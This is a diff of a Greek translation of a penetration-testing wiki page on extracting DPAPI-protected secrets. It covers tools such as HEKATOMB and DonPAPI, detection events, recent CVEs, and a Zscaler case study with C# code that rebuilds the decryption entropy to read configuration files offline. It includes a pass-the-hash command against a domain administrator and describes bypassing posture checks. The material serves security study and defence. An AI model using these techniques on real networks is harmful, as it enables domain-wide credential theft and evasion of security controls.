-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα εργαλείο που αυτοματοποιεί την εξαγωγή όλων των χρηστών και υπολογιστών από τον κατάλογο LDAP και την εξαγωγή του κλειδιού αντιγράφου ασφαλείας του ελεγκτή τομέα μέσω RPC. Το σενάριο θα επιλύσει στη συνέχεια τη διεύθυνση IP όλων των υπολογιστών και θα εκτελέσει ένα smbclient σε όλους τους υπολογιστές για να ανακτήσει όλα τα DPAPI blobs όλων των χρηστών και να αποκρυπτογραφήσει τα πάντα με το κλειδί αντιγράφου ασφαλείας του τομέα.
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα εργαλείο που αυτοματοποιεί την εξαγωγή όλων των χρηστών και υπολογιστών από τον LDAP directory και την εξαγωγή του domain controller backup key μέσω RPC. Το script στη συνέχεια θα επιλύσει όλες τις IP διευθύνσεις των υπολογιστών και θα εκτελέσει smbclient σε όλους τους υπολογιστές για να ανακτήσει όλα τα DPAPI blobs όλων των χρηστών και να αποκρυπτογραφήσει τα πάντα με το domain backup key.
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-Με τη λίστα υπολογιστών που εξήχθη από το LDAP μπορείτε να βρείτε κάθε υποδίκτυο ακόμα και αν δεν τα γνωρίζατε!
+Με τη λίστα υπολογιστών εξαγόμενη από το LDAP μπορείτε να βρείτε κάθε υποδίκτυο ακόμη και αν δεν τα γνωρίζατε!
 
 ### DonPAPI 2.x (2024-05)
 
-[**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί να εξάγει μυστικά που προστατεύονται από DPAPI αυτόματα. Η έκδοση 2.x εισήγαγε:
+[**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί αυτόματα να dumpάρει μυστικά προστατευμένα από DPAPI. Η έκδοση 2.x εισήγαγε:
 
 * Παράλληλη συλλογή blobs από εκατοντάδες hosts
 * Ανάλυση των **context 3** masterkeys και αυτόματη ενσωμάτωση cracking με Hashcat
-* Υποστήριξη για κρυπτογραφημένα cookies "App-Bound" του Chrome (βλ. επόμενη ενότητα)
-* Μια νέα λειτουργία **`--snapshot`** για επαναλαμβανόμενη παρακολούθηση των endpoints και διαφορές σε νεοδημιουργημένα blobs
+* Υποστήριξη για Chrome "App-Bound" encrypted cookies (βλέπε επόμενη ενότητα)
+* Νέα λειτουργία **`--snapshot`** για επαναλαμβανόμενη polling των endpoints και diff των νεοδημιουργημένων blobs
 
 ### DPAPISnoop
 
-[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) είναι ένας αναλυτής C# για αρχεία masterkey/credential/vault που μπορεί να εξάγει μορφές Hashcat/JtR και προαιρετικά να εκκινήσει αυτόματα το cracking. Υποστηρίζει πλήρως τις μορφές masterkey μηχανής και χρήστη μέχρι τα Windows 11 24H1.
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) είναι ένας C# parser για masterkey/credential/vault αρχεία που μπορεί να εξάγει μορφές για Hashcat/JtR και προαιρετικά να καλεί το cracking αυτόματα. Υποστηρίζει πλήρως τα machine και user masterkey formats μέχρι και Windows 11 24H1.
 
-## Κοινές ανιχνεύσεις
 
-- Πρόσβαση σε αρχεία στο `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` και άλλους σχετικούς με DPAPI καταλόγους.
-- Ιδιαίτερα από ένα κοινόχρηστο δίκτυο όπως **C$** ή **ADMIN$**.
-- Χρήση του **Mimikatz**, **SharpDPAPI** ή παρόμοιων εργαλείων για πρόσβαση στη μνήμη LSASS ή εξαγωγή masterkeys.
-- Συμβάν **4662**: *Μια ενέργεια πραγματοποιήθηκε σε ένα αντικείμενο* – μπορεί να συσχετιστεί με την πρόσβαση στο αντικείμενο **`BCKUPKEY`**.
-- Συμβάν **4673/4674** όταν μια διαδικασία ζητά *SeTrustedCredManAccessPrivilege* (Credential Manager)
+## Συνηθισμένες ανιχνεύσεις
+
+- Πρόσβαση σε αρχεία στο `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` και σε άλλους DPAPI-related φακέλους.
+- Ειδικά από network share όπως **C$** ή **ADMIN$**.
+- Χρήση των **Mimikatz**, **SharpDPAPI** ή παρόμοιων εργαλείων για πρόσβαση στη μνήμη LSASS ή dump των masterkeys.
+- Event **4662**: *An operation was performed on an object* – μπορεί να συσχετιστεί με πρόσβαση στο αντικείμενο **`BCKUPKEY`**.
+- Event **4673/4674** όταν μια διεργασία ζητάει *SeTrustedCredManAccessPrivilege* (Credential Manager)
 
 ---
-### Ευπάθειες 2023-2025 & αλλαγές οικοσυστήματος
+### 2023-2025 ευπάθειες & αλλαγές στο οικοσύστημα
 
-* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Νοέμβριος 2023). Ένας επιτιθέμενος με πρόσβαση στο δίκτυο θα μπορούσε να εξαπατήσει ένα μέλος τομέα να ανακτήσει ένα κακόβουλο κλειδί αντιγράφου ασφαλείας DPAPI, επιτρέποντας την αποκρυπτογράφηση των masterkeys χρηστών. Διορθώθηκε στην σωρευτική ενημέρωση του Νοεμβρίου 2023 – οι διαχειριστές θα πρέπει να διασφαλίσουν ότι οι DCs και οι σταθμοί εργασίας είναι πλήρως ενημερωμένοι.
-* **Κρυπτογράφηση cookie "App-Bound" Chrome 127** (Ιούλιος 2024) αντικατέστησε την κλασική προστασία μόνο DPAPI με ένα επιπλέον κλειδί που αποθηκεύεται κάτω από τον **Credential Manager** του χρήστη. Η εκτός σύνδεσης αποκρυπτογράφηση των cookies απαιτεί τώρα τόσο το masterkey DPAPI όσο και το **GCM-wrapped app-bound key**. Το SharpChrome v2.3 και το DonPAPI 2.x είναι ικανά να ανακτήσουν το επιπλέον κλειδί όταν εκτελούνται με το πλαίσιο χρήστη.
+* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ένας επιτιθέμενος με δικτυακή πρόσβαση μπορούσε να ξεγελάσει ένα domain member ώστε να ανακτήσει ένα κακόβουλο DPAPI backup key, επιτρέποντας την αποκρυπτογράφηση των user masterkeys. Διορθώθηκε στο November 2023 cumulative update – οι διαχειριστές θα πρέπει να βεβαιωθούν ότι οι DCs και τα workstations είναι πλήρως patched.
+* **Chrome 127 “App-Bound” cookie encryption** (July 2024) αντικατέστησε την παλιά προστασία που βασιζόταν μόνο σε DPAPI με ένα επιπλέον κλειδί αποθηκευμένο στο user’s **Credential Manager**. Η offline αποκρυπτογράφηση των cookies τώρα απαιτεί τόσο το DPAPI masterkey όσο και το **GCM-wrapped app-bound key**. Το SharpChrome v2.3 και το DonPAPI 2.x μπορούν να ανακτήσουν το επιπλέον κλειδί όταν εκτελούνται με user context.
 
-### Μελέτη Περίπτωσης: Zscaler Client Connector – Προσαρμοσμένη Εντροπία που Προέρχεται από SID
 
-Ο Zscaler Client Connector αποθηκεύει αρκετά αρχεία ρυθμίσεων κάτω από το `C:\ProgramData\Zscaler` (π.χ. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Κάθε αρχείο είναι κρυπτογραφημένο με **DPAPI (Machine scope)** αλλά ο προμηθευτής παρέχει **προσαρμοσμένη εντροπία** που υπολογίζεται κατά την εκτέλεση αντί να αποθηκεύεται στο δίσκο.
+### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID
 
-Η εντροπία ανακατασκευάζεται από δύο στοιχεία:
+Zscaler Client Connector αποθηκεύει αρκετά configuration αρχεία κάτω από `C:\ProgramData\Zscaler` (π.χ. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Κάθε αρχείο κρυπτογραφείται με **DPAPI (Machine scope)** αλλά ο vendor παρέχει **προσαρμοσμένη εντροπία** η οποία *υπολογίζεται κατά το runtime* αντί να αποθηκεύεται στο δίσκο.
 
-1. Ένα σκληρά κωδικοποιημένο μυστικό που είναι ενσωματωμένο μέσα στο `ZSACredentialProvider.dll`.
-2. Το **SID** του λογαριασμού Windows στον οποίο ανήκει η ρύθμιση.
+Η εντροπία ανασυντίθεται από δύο στοιχεία:
+
+1. Ένα hard-coded secret ενσωματωμένο μέσα στο `ZSACredentialProvider.dll`.
+2. Το **SID** του Windows account στο οποίο ανήκει η ρύθμιση.
 
 Ο αλγόριθμος που υλοποιείται από το DLL είναι ισοδύναμος με:
 ```csharp
@@ -322,17 +325,17 @@ byte[] entropy = new byte[tmp.Length / 2];
 for (int i = 0; i < entropy.Length; i++)
 entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
 ```
-Επειδή το μυστικό είναι ενσωματωμένο σε μια DLL που μπορεί να διαβαστεί από το δίσκο, **οποιοσδήποτε τοπικός επιτιθέμενος με δικαιώματα SYSTEM μπορεί να αναγεννήσει την εντροπία για οποιοδήποτε SID** και να αποκρυπτογραφήσει τα blobs εκτός σύνδεσης:
+Επειδή το μυστικό είναι ενσωματωμένο σε ένα DLL που μπορεί να διαβαστεί από τον δίσκο, **οποιοσδήποτε τοπικός επιτιθέμενος με δικαιώματα SYSTEM μπορεί να αναδημιουργήσει την entropy για οποιοδήποτε SID** και να αποκρυπτογραφήσει τα blobs εκτός σύνδεσης:
 ```csharp
 byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
 byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
 Console.WriteLine(Encoding.UTF8.GetString(clear));
 ```
-Η αποκρυπτογράφηση αποδίδει την πλήρη διαμόρφωση JSON, συμπεριλαμβανομένου κάθε **έλεγχου στάσης συσκευής** και της αναμενόμενης τιμής του – πληροφορίες που είναι πολύτιμες κατά την προσπάθεια παράκαμψης από την πλευρά του πελάτη.
+Η αποκρυπτογράφηση αποδίδει την πλήρη JSON διαμόρφωση, συμπεριλαμβανομένου κάθε **device posture check** και της αναμενόμενης τιμής του – πληροφορία που είναι πολύτιμη όταν επιχειρούνται client-side bypasses.
 
-> TIP: τα άλλα κρυπτογραφημένα αντικείμενα (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) προστατεύονται με DPAPI **χωρίς** εντροπία (`16` μηδενικά bytes). Μπορούν επομένως να αποκρυπτογραφηθούν απευθείας με `ProtectedData.Unprotect` μόλις αποκτηθούν τα δικαιώματα SYSTEM.
+> ΣΥΜΒΟΥΛΗ: τα άλλα κρυπτογραφημένα artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) προστατεύονται με DPAPI **χωρίς** entropy (`16` zero bytes). Συνεπώς μπορούν να αποκρυπτογραφηθούν απευθείας με `ProtectedData.Unprotect` μόλις αποκτηθούν προνόμια SYSTEM.
 
-## References
+## Αναφορές
 
 - [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
